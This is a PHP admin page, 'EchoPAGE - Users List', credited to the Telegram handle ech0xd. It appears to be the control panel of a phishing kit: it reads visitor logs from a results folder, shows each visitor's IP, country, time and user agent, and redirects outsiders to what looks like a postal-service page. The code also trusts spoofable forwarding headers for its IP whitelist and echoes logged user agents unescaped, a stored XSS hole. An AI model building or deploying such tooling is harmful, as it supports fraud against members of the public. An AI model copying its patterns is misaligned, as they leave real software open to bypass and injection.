<?php

function getIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

$ini_array = parse_ini_file("setting.ini");

$whitelistedIP = strval($ini_array['WhitelistedIp']);
$currentIP = getIP();

function getCountry($ip) {
  $ip_data = @json_decode(file_get_contents("http://ipwho.is/".$ip));
  $country = $ip_data->country_code;
  if ($country == "") {
      $country = "Unknown";
  }
  return $country;
}

$currentCountry = getCountry($currentIP);

if ($whitelistedIP == $currentIP) {
  error_reporting(0);
  session_start();
  if (!isset($_SESSION['login-username'])) {
      header("location: index.php");
      exit();
  }

  function countClicks($filename) {
      $totalClicks = 0;
      $handle = fopen($filename, "r");
      if ($handle) {
          while (!feof($handle)) {
              fgets($handle);
              $totalClicks++;
          }
          fclose($handle);
      }
      return $totalClicks;
  }

  $log_visitor = countClicks("../result/log_visitor.txt");
} else {
  $os = $_SERVER['HTTP_USER_AGENT'];
  $click = fopen("../result/total_Blocked.txt", "a");
  date_default_timezone_set("America/Edmonton");
  $jam = date("Y/m/d H:i");
  fwrite($click, "$currentIP|$currentCountry|$jam|$os|Access to the admin panel is blocked"."\n");
  fclose($click);

  header("Location: //cpc/en/home.page");
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
    <title>EchoPAGE - Users List</title>
    <meta
      name="description"
      content="Dashmix - Bootstrap 5 Admin Template &amp; UI Framework created by pixelcave and published on Themeforest"
    />
    <meta name="author" content="pixelcave" />
    <meta name="robots" content="noindex, nofollow" />
    <!-- Open Graph Meta -->
    <meta
      property="og:title"
      content="Dashmix - Bootstrap 5 Admin Template &amp; UI Framework"
    />
    <meta property="og:site_name" content="Dashmix" />
    <meta
      property="og:description"
      content="Dashmix - Bootstrap 5 Admin Template &amp; UI Framework created by pixelcave and published on Themeforest"
    />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="" />
    <meta property="og:image" content="" />
    <!-- Icons -->
    <!-- The following icons can be replaced with your own,they are used by desktop and mobile browsers -->
    <link rel="shortcut icon" href="img/favicon.png" />
    <link
      rel="icon"
      type="image/png"
      sizes="192x192"
      href="img/favicon-192x192.png"
    />
    <link
      rel="apple-touch-icon"
      sizes="180x180"
      href="img/apple-touch-icon-180x180.png"
    />
    <!-- END Icons -->
    <!-- Stylesheets -->
    <!-- Fonts and Dashmix framework -->
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap"
    />
    <link rel="stylesheet" id="css-main" href="css/dashmix.min.css" />
    <!-- You can include a specific file from css/themes/ folder to alter the default color theme of the template. eg:-->
    <!-- <link rel="stylesheet" id="css-theme" href="assets/css/themes/xwork.min.css">-->
    <!-- END Stylesheets -->
  </head>
  <body>
    <!-- Page Container --><!-- Available classes for #page-container:GENERIC 'remember-theme' Remembers active color theme and dark mode between pages using localStorage when set through - Theme helper buttons [data-toggle="theme"],- Layout helper buttons [data-toggle="layout" data-action="dark_mode_[on/off/toggle]"] - ..and/or Dashmix.layout('dark_mode_[on/off/toggle]') SIDEBAR & SIDE OVERLAY 'sidebar-r' Right Sidebar and left Side Overlay(default is left Sidebar and right Side Overlay) 'sidebar-mini' Mini hoverable Sidebar(screen width>991px) 'sidebar-o' Visible Sidebar by default(screen width>991px) 'sidebar-o-xs' Visible Sidebar by default(screen width < 992px) 'sidebar-dark' Dark themed sidebar 'side-overlay-hover' Hoverable Side Overlay(screen width>991px) 'side-overlay-o' Visible Side Overlay by default 'enable-page-overlay' Enables a visible clickable Page Overlay(closes Side Overlay on click) when Side Overlay opens 'side-scroll' Enables custom scrolling on Sidebar and Side Overlay instead of native scrolling(screen width>991px) HEADER '' Static Header if no class is added 'page-header-fixed' Fixed Header FOOTER '' Static Footer if no class is added 'page-footer-fixed' Fixed Footer(please have in mind that the footer has a specific height when is fixed) HEADER STYLE '' Classic Header style if no class is added 'page-header-dark' Dark themed Header 'page-header-glass' Light themed Header with transparency by default(absolute position,perfect for light images underneath - solid light background on scroll if the Header is also set as fixed) 'page-header-glass page-header-dark' Dark themed Header with transparency by default(absolute position,perfect for dark images underneath - solid dark background on scroll if the Header is also set as fixed) MAIN CONTENT LAYOUT '' Full width Main Content if no class is added 'main-content-boxed' Full width Main Content with a specific maximum width(screen width>1200px) 'main-content-narrow' Full width Main Content with a percentage width(screen width>1200px) DARK MODE 'sidebar-dark page-header-dark dark-mode' Enable dark mode(light sidebar/header is not supported with dark mode) -->
    <div id="page-container" class="page-header-dark main-content-boxed">
      <!-- Header -->
 
      <main id="main-container">
        <!-- Navigation -->
        <div class="bg-sidebar-dark">
          <div class="content">
            <!-- Toggle Main Navigation -->
            <div class="d-lg-none push">
              <!-- Class Toggle,functionality initialized in Helpers.dmToggleClass() --><button
                type="button"
                class="btn w-100 btn-primary d-flex justify-content-between align-items-center"
                data-toggle="class-toggle"
                data-target="#main-navigation"
                data-class="d-none"
              >
                Menu <i class="fa fa-bars"></i>
              </button>
            </div>
            <!-- END Toggle Main Navigation --><!-- Main Navigation -->
            <div id="main-navigation" class="d-none d-lg-block push">
              <ul
                class="nav-main nav-main-horizontal nav-main-hover nav-main-dark"
              >
                 <li class="nav-main-item">
                  <a class="nav-main-link" href="Dashboard.php"
                    ><i class="nav-main-link-icon fa fa-compass"></i
                    ><span class="nav-main-link-name">Dashboard</span></a
                  >
                </li>
                


                <li class="nav-main-item">
                  <a class="nav-main-link active" href="User.php"
                    ><i class="nav-main-link-icon fa fa-user-friends"></i
                    ><span class="nav-main-link-name">User list</span></a
                  >
                </li>

                 <li class="nav-main-item">
                  <a class="nav-main-link" href="Blocklist.php"
                    ><i class="nav-main-link-icon fa fa-ghost"></i
                    ><span class="nav-main-link-name">Block list</span></a
                  >
                </li>

                <li class="nav-main-heading">Extra</li>

                <li class="nav-main-item ms-lg-auto">
                                                  <li class="nav-main-item">
                  <a class="nav-main-link" href="Reset.php"
                    ><i class="fa fa-bolt text-muted me-1"></i
                    ><span class="nav-main-link-name">Reset data</span></a
                  >
                </li>
                  <a class="nav-main-link" href="Logout.php"
                    ><i class="nav-main-link-icon fa fa-coffee"></i
                    ><span class="nav-main-link-name">Log out</span></a
                  >


                </li>
              </ul>
            </div>
            <!-- END Main Navigation -->
          </div>
        </div>
        <!-- END Navigation --><!-- Page Content -->
        <div class="content">
          <!-- Quick Stats --><!-- jQuery Sparkline(.js-sparkline class is initialized in Helpers.jqSparkline() --><!-- For more info and examples you can check out http://omnipotent.net/jquery.sparkline/#s-about -->
 
          <!-- END Quick Stats --><!-- Users and Purchases -->
          <div class="block block-rounded block-mode-loading-refresh">
            

            <div class="block block-rounded block-mode-loading-refresh">
              <!-- Purchases -->
              <div
                class="block block-rounded block-mode-loading-refresh h-100 mb-0"
              >
                <div class="block-header block-header-default">
                  <h3 class="block-title">Visitors { <?php echo $log_visitor;?> }</h3>
                </div>

                <div class="block-content">
                  <table
                    class="table table-striped table-hover table-borderless table-vcenter fs-sm"
                  >
                    <thead>
                      <tr class="text-uppercase">
                        <th class="fw-bold">Country</th>
                       <th class="fw-bold">Ip</th>
                        <th class="fw-bold">Time</th>
                        <th class="d-none d-sm-table-cell fw-bold">Os</th>
                      </tr>
                    </thead>
                  <tbody>
            <!-- ---------------------------- -->
                                             <?php
                                            if(file_exists("../result/log_visitor.txt")){
                                            $bin = file_get_contents("../result/log_visitor.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $ip = $bins[0];
                                                $country = $bins[1];
                                                $time = $bins[2];
                                                $os = $bins[3];                                              
                                                if($ip == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img style='border-radius: 2px;margin-right:5%;margin-top:-2%;' width='30' height='16' src='https://flagpedia.net/data/flags/w580/".strtolower($country).".webp'>  ".strtoupper($country)."</td>
                                                <td>".$ip."</td>                                         
                                                <td>".$time."</td>
                                                <td>".$os."</td>
                                                </tr>";
                                                }
                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
                                            }
                                            ?>
                                        
                    
            <!-- ---------------------------- -->
                  </tbody>
                  </table>
                </div>
              </div>
              <!-- END Purchases -->
            </div>
          </div>
          <!-- END Users and Purchases -->
        </div>
        <!-- END Page Content -->
      </main>
      <!-- END Main Container -->

      <!-- Footer -->
      <footer id="page-footer" class="footer-static bg-body-extra-light">
        <div class="content py-4">
          <!-- Footer Navigation -->


          <!-- Footer Copyright -->
          <div class="row fs-sm pt-4">
            <div
              class="col-sm-6 order-sm-2 mb-1 mb-sm-0 text-center text-sm-end"
            >
              Crafted with <i class="fa fa-heart text-danger"></i> by
              <a
                class="fw-semibold"
                href="https://t.me/ech0xd"
                target="_blank"
                >ech0xd</a
              >
            </div>
            <div class="col-sm-6 order-sm-1 text-center text-sm-start">
              <a
                class="fw-semibold"
                href="https://t.me/ech0xd"
                target="_blank"
                >EchoPAGE</a
              >
              © <span data-toggle="year-copy"></span>
            </div>
          </div>
          <!-- END Footer Copyright -->
        </div>
      </footer>
      <!-- END Footer -->
    </div>
    <!-- END Page Container -->

    <!--
      Dashmix JS

      Core libraries and functionality
      webpack is putting everything together at assets/_js/main/app.js
    -->
    <script src="js/dashmix.app.min.js"></script>

    <!-- jQuery (required for jQuery Sparkline plugin) -->
    <script src="js/jquery.min.js"></script>

    <!-- Page JS Plugins -->
    <script src="js/jquery.sparkline.min.js"></script>
    <script src="js/chart.min.js"></script>

    <!-- Page JS Code -->
    <script src="js/be_pages_dashboard_v1.min.js"></script>
    <!-- Page JS Helpers(jQuery Sparkline plugin) -->
  </body>
</html>
